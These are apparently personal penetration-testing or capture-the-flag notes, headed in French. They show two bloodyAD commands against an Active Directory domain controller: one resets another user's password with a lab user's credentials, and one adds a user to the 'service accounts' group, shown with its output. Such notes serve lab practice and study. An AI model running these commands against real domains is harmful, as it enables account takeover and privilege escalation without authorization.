

### Changement de mdp
```bash 
bloodyad -d administrator -u 'Olivia' -p 'ichliebedich' --host 10.129.41.212 set password Michael Password1234*
```

### Ajouter un user dans un groupe
```bash
bloodyad -u <USER> -p <PASS> -d <DOMAIN-NAME> --host <IP-DC> add groupMember 'service accounts' <USER_CIBLE>

[+] p.agila added to service accounts
```
